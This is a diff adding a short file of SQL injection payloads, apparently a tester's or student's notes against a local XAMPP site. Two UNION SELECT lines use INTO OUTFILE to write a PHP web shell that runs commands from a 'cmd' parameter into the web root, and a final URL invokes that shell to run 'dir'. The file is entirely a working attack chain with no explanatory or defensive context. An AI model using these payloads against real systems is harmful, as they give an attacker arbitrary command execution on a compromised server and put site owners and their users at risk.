@@ -1,0 +1,8 @@
+0 union select '<?php system($_GET["cmd"]); ?>' into OUTFILE 'C:/xampp/htdocs/cmd.php' #
+
+
+" union select 1,2, '<?php system($_GET["cmd"]); ?>' into OUTFILE 'C:/xampp/htdocs/project/cmd.php' #
+
+
+
+http://localhost/project/cmd.php?cmd=dir
